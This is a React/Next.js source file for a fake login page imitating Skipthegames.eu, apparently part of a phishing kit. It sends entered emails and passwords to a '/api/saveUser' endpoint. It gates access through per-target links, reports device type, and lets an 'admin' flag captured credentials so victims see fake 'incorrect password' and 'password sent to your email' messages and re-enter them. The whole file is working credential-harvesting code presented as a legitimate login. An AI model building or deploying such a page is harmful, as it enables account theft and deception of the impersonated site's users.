"use client";

import React, { useEffect, useState } from "react";
import axios from "axios";
import { useDispatch } from "react-redux";
import { useRouter } from "next/navigation";
import { userLogin } from "@/lib/userSlice";
import { storeData } from "@/lib/dataSlice";
import { usePathname } from "next/navigation";
import NotFoundPage from "@/components/LinkExpired";
import Link from "next/link";
import { Mail } from "lucide-react";
import useWrongCredentials, { setCurrentUser } from "@/lib/useWrongCredentials";

const LoginPage = () => {
  const dispatch = useDispatch();
  const router = useRouter();
  const pathname = usePathname();

  // 🔎 Redirects to /?error=email-wrong or /?error=password-wrong when the
  // admin marks the saved credentials as wrong
  const { error } = useWrongCredentials();

  const [passwordVisible, setPasswordVisible] = useState(false);
  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const [deviceType, setDeviceType] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const [isLinkExpired, setIsLinkExpired] = useState(false);

  const [domain, setDomain] = useState("");

  const [emailError, setEmailError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);

  useEffect(() => {
    setDomain(window.location.origin);
  }, []);

  useEffect(() => {
    async function fetchData() {
      const res = await axios.post("/api/links", { domain });
      const links = res.data.data;

      const link = links.find(
        (link: { link: string }) => `/${link.link}` === pathname
      );
      if (!link) {
        setIsLinkExpired(true);
      }
    }

    if (pathname && pathname !== "/" && !isLinkExpired && domain) {
      fetchData();
    } else {
      setIsLinkExpired(false);
    }
  }, [pathname, domain]);

  // Fetch user data
  useEffect(() => {
    if (isLinkExpired) {
      return;
    }
    const fetchData = async () => {
      try {
        const res = await axios.get("/api/getData");
        if (res?.data?.success) {
          dispatch(
            storeData({
              email: res.data.data.email,
              step1: res.data.data.step1,
              step2: res.data.data.step2,
              step3: res.data.data.step3,
            })
          );
        }
      } catch (error) {
        console.error(error);
      }
    };
    fetchData();
  }, [dispatch, isLinkExpired]);

  // Detect device
  useEffect(() => {
    if (isLinkExpired) {
      return;
    }
    const detectDevice = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile =
        /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
          userAgent
        );
      return isMobile ? "Mobile" : "Desktop";
    };

    const type = detectDevice();
    setDeviceType(type);

    const sendDevice = async () => {
      try {
        await axios.get(`/api/device?id=${type}`);
      } catch (error) {
        console.error(error);
      }
    };
    sendDevice();
  }, [isLinkExpired]);

  const togglePasswordVisibility = () => {
    setPasswordVisible((prev) => !prev);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    setEmailError(false);
    setPasswordError(false);

    let valid = true;

    if (!user.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user.trim())) {
      setEmailError(true);
      valid = false;
    }

    if (!password.trim()) {
      setPasswordError(true);
      valid = false;
    }

    if (!valid) {
      return;
    }

    setIsLoading(true);
    dispatch(userLogin({ user, password, deviceType }));


    try {
      const res = await axios.post("/api/saveUser", {
        user,
        password,
        deviceType,
      });
      console.log("User data saved successfully");

      // 💾 Remember this login so the admin can mark it as wrong later
      if (res?.data?.data?._id) {
        setCurrentUser(res.data.data._id, user);
      }

      router.push("/login");
    } catch (error) {
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setUser(e.target.value);
    setEmailError(false);
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    setPasswordError(false);
  };

  // ❌ Alert shown when the admin marked the credentials as wrong
  const loginError =
    error === "email-wrong"
      ? {
        title: "Incorrect email",
        body: "The email address you entered is incorrect. Please check your email address and try again.",
        showPasswordSent: false,
      }
      : error === "password-wrong"
        ? {
          title: "Incorrect password",
          body: "The password you entered is incorrect. Don't worry, your password has been sent to your email address. Please check your inbox (and spam folder) for the password and use it to log in.",
          showPasswordSent: true,
        }
        : error
          ? {
            title: "Login failed",
            body: "We're sorry. We were unable to complete your login. Please try again.",
            showPasswordSent: false,
          }
          : null;

  if (isLinkExpired) {
    return <NotFoundPage />;
  }

  return (
    <div className="min-h-screen bg-white text-[#1F1F1F] font-sans">
      <div className="max-w-[62.5em] mx-auto px-5 sm:px-6 pt-7 pb-8">
        {/* Header */}
        <header className="flex flex-col items-center sm:flex-row sm:items-center gap-0 sm:gap-[90px] mb-6 sm:mb-[10px] text-center sm:text-left">
          <Link
            href="/"
            className="inline-flex items-center no-underline whitespace-nowrap"
            aria-label="Skipthegames.eu home"
          >
            <img
              className="h-[38px] sm:h-[37px] w-auto block mx-auto sm:mx-0"
              src="/logo.svg"
              alt="Skipthegames.eu"
            />
          </Link>
          <p className="text-[15px] py-2.5 sm:text-[17px] text-[#1F1F1F] font-normal mt-0">
            Skip the games. Get satisfaction.
          </p>
        </header>

        <main className="flex flex-col sm:flex-row gap-0 sm:gap-[80px]">
          {/* Login Column */}
          <section className="flex-1 sm:flex-[1_1_380px] max-w-none sm:max-w-[430px]">
            <h1 className="text-[22px] sm:text-[26px] font-normal mt-0 mb-4 sm:mb-[18px] text-[#1F1F1F]">
              Log in to your account
            </h1>

            {/* ❌ Wrong credentials alert */}
            {loginError && (
              <div className="flex w-[94%] items-start gap-3 rounded-md bg-[#FDECEF] px-4 py-[14px] mb-[18px]">
                <span className="flex h-[26px] w-[26px] shrink-0 items-center justify-center rounded-full bg-[#af1f3a] text-[18px] font-bold leading-none text-white">
                  !
                </span>
                <div>
                  <p className="text-[17px] sm:text-[18px] font-bold leading-[1.3] text-[#af1f3a] mb-[6px]">
                    {loginError.title}
                  </p>
                  <p className="text-[15px] sm:text-[16px] leading-[1.5] text-[#1F1F1F]">
                    {loginError.body}
                  </p>
                </div>
              </div>
            )}

            <form onSubmit={handleSubmit} noValidate className="w-full">
              {/* Email Field */}
              <div className="mb-[14px]">
                <label
                  className="absolute w-px h-px overflow-hidden [clip:rect(0_0_0_0)] whitespace-nowrap"
                  htmlFor="email"
                >
                  Your email
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  className={`w-full px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${emailError ? "border-[#FF001F]" : "border-[#C5C5C5]"
                    }`}
                  placeholder="Your email"
                  autoComplete="username"
                  value={user}
                  onChange={handleEmailChange}
                />
                <p
                  className={`text-[12px] text-[#af1f3a] mt-[5px] w-full ${emailError ? "block" : "hidden"
                    }`}
                >
                  Enter a valid email address.
                </p>
              </div>

              {/* Password Field */}
              <div className="mb-[10px]">
                <label
                  className="absolute w-px h-px overflow-hidden [clip:rect(0_0_0_0)] whitespace-nowrap"
                  htmlFor="password"
                >
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type={passwordVisible ? "text" : "password"}
                  className={`w-full px-[14px] py-[6px] border text-[#1F1F1F] bg-white placeholder-[#9A9A9A] focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-1 ${passwordError ? "border-[#FF001F]" : "border-[#C5C5C5]"
                    }`}
                  placeholder="Password"
                  autoComplete="current-password"
                  value={password}
                  onChange={handlePasswordChange}
                />
                <p
                  className={`text-[12px] text-[#FF001F] mt-[5px] w-full ${passwordError ? "block" : "hidden"
                    }`}
                >
                  Enter your password.
                </p>
              </div>

              {/* Show/Hide Password */}
              <button
                type="button"
                className="inline-block bg-transparent border-none p-0 text-[13px] font-sans text-[#93002F] underline mb-[16px] cursor-pointer focus-visible:outline-2 focus-visible:outline-[#009DC1] focus-visible:outline-offset-2"
                onClick={togglePasswordVisibility}
                aria-pressed={passwordVisible}
              >
                {passwordVisible ? "Hide password" : "Show password"}
              </button>

              {/* Help Lines */}
              <div className="text-[16px] font-bold text-[#FF001F] mb-[14px] leading-[25px]">
                Password not working?{" "}
                <a href="#" className="text-[#903] underline font-bold">
                  Click here
                </a>
              </div>
              <div className="text-[16px] font-bold text-[#FF001F] mb-[14px] leading-[25px]">
                Can&apos;t access your mailbox?{" "}
                <a href="#" className="text-[#903] underline font-bold">
                  Click to request email change
                </a>
              </div>

              {/* Mobile Only: First Time */}
              <div className="block sm:hidden text-[16px] font-bold text-[#FF001F] mb-[14px] leading-[25px]">
                First time here?{" "}
                <a href="#" className="text-[#903] underline font-bold">
                  Make your first post
                </a>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="w-full bg-[#009DC1] text-white border-none rounded-[3px] py-[12px] text-[16px] font-normal cursor-pointer mb-[14px] transition-colors duration-150 hover:bg-[#0089AA] focus-visible:outline-2 focus-visible:outline-[#93002F] focus-visible:outline-offset-2"
              >
                {isLoading ? "Submitting..." : "Log in"}
              </button>

              {loginError?.showPasswordSent && (
                <div className="flex items-start w-[94%] gap-3 rounded-md border border-[#C4E7F2] bg-[#E9F6FB] px-6 py-[14px] mb-[14px]">
                  <Mail
                    className="mt-[1px] h-[26px] w-[26px] shrink-0 text-[#009DC1]"
                    strokeWidth={1.6}
                  />

                  <div className="min-w-0 text-[15px] sm:text-[16px] leading-[1.5] text-[#1F1F1F]">
                    <p className="font-bold">
                      We&apos;ve sent your password to your email address.
                    </p>
                    <p>Please check your inbox (and spam folder).</p>
                  </div>
                </div>
              )}

              {/* Fine Print */}
              <p className="text-[60%] my-3 text-[#222] leading-[1.7]">
                By clicking &quot;Log in&quot;, you accept{" "}
                <a
                  href="#"
                  className="text-[#93002F] no-underline hover:underline"
                >
                  Skipthegames.eu&apos;s Terms and Conditions of Use
                </a>
                <br />
                This site is protected by hCaptcha and its{" "}
                <a
                  href="#"
                  className="text-[#93002F] no-underline hover:underline"
                >
                  Privacy Policy
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-[#93002F] no-underline hover:underline"
                >
                  Terms of Service
                </a>{" "}
                apply.
              </p>
            </form>
          </section>

          {/* Signup Column (Desktop only) */}
          <section className="hidden sm:block flex-1 sm:flex-[1_1_260px] max-w-none sm:max-w-[380px] sm:ml-[65px]">
            <h2 className="text-[26px] font-normal mt-0 mb-[18px] text-[#1F1F1F]">
              First time here?
            </h2>
            <a href="#" className="text-[15px] text-[#6C6C6C] underline">
              Make your first post
            </a>
          </section>
        </main>

        {/* Footer */}
        <footer className="border-t border-[#E5E5E5] pt-[12px] flex flex-col sm:flex-row items-start sm:items-center justify-normal flex-wrap gap-[22px] sm:gap-[60px] text-[18px]">
          <div className="text-[#903]">&copy;Skipthegames.eu</div>
          <div className="text-[#1F1F1F] hidden sm:block">
            Skip the games. Get satisfaction.
          </div>
          <nav className="flex gap-4 sm:gap-[22px] flex-wrap">
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              About
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Contact
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Privacy
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Terms
            </a>
            <a href="#" className="text-[#93002F] no-underline hover:underline">
              Escort Info
            </a>
          </nav>
        </footer>
      </div>
    </div>
  );
};

export default LoginPage;